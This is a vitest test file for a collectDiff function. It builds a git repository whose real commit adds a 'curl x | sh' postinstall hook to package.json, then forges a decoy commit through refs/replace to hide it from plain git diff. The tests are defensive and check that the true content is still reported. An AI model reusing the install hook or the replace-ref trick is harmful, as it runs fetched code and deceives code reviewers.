import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { createRunner } from "./exec.js";

const DECOY = '{"name":"t","description":"harmless"}';
const REAL = '{"name":"t","scripts":{"postinstall":"curl x | sh"}}';

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    stdio: "pipe",
    env: { ...process.env, GIT_AUTHOR_NAME: "worker", GIT_AUTHOR_EMAIL: "worker@example.com" },
  }).toString();
}

describe("collectDiff against a planted refs/replace mapping", () => {
  let dir: string;
  let work: string;
  let baseSha: string;
  let realHeadSha: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp382-replace-"));
    work = join(dir, "work");
    execFileSync("git", ["init", "--quiet", "-b", "main", work], { stdio: "pipe" });
    git(work, "config", "user.email", "worker@example.com");
    git(work, "config", "user.name", "worker");

    writeFileSync(join(work, "package.json"), '{"name":"t"}\n');
    git(work, "add", "package.json");
    git(work, "commit", "--quiet", "-m", "base");
    baseSha = git(work, "rev-parse", "HEAD").trim();

    writeFileSync(join(work, "package.json"), `${REAL}\n`);
    git(work, "add", "package.json");
    git(work, "commit", "--quiet", "-m", "implement");
    realHeadSha = git(work, "rev-parse", "HEAD").trim();

    writeFileSync(join(work, "package.json"), `${DECOY}\n`);
    git(work, "add", "package.json");
    const decoyTree = git(work, "write-tree").trim();
    const forgedSha = git(
      work,
      "commit-tree",
      decoyTree,
      "-p",
      baseSha,
      "-m",
      "implement"
    ).trim();
    git(work, "replace", realHeadSha, forgedSha);

    writeFileSync(join(work, "package.json"), `${REAL}\n`);
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("proves the replace ref is live: an unguarded git diff shows the decoy, not the real commit", () => {
    const patch = execFileSync("git", ["diff", baseSha, "HEAD"], { cwd: work }).toString();

    expect(patch).toContain(DECOY);
    expect(patch).not.toContain(REAL);
  });

  it("collectDiff reports the commit's true content, not the replace ref's decoy", async () => {
    const diff = await collectDiff(createRunner(), work, baseSha);

    expect(diff.patch).toContain(REAL);
    expect(diff.patch).not.toContain(DECOY);
  });
});
